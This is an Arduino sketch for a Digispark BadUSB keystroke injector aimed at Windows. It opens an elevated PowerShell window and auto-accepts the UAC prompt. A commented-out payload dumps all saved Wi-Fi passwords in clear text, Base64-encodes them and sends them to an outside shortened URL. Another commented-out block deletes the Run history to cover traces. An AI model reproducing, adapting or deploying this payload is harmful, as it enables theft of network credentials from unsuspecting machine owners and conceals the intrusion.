#include "DigiKeyboard.h"
/* Init function */

void setup()
{//turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
  pinMode(1, OUTPUT); //LED on Model A
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  // Modify 127.0.0.1 with your IP address and payload.exe with your payload file name
  //DigiKeyboard.println("Invoke-WebRequest -Uri \"https://tinyurl.com/bdd5j46j?var=$([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Out-String -InputObject ((netsh wlan show profiles) | Select-String \"\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)} | Select-String \"Contenu de la clé\W+\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME123456789123456789123456789123456789=$name; PASSWORD123456789123456789123456789123456789=$pass }})))))\" | Out-Null");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  // Clear run command history
  /* DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); */
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH);
}

/* Unused endless loop */
void loop() {}
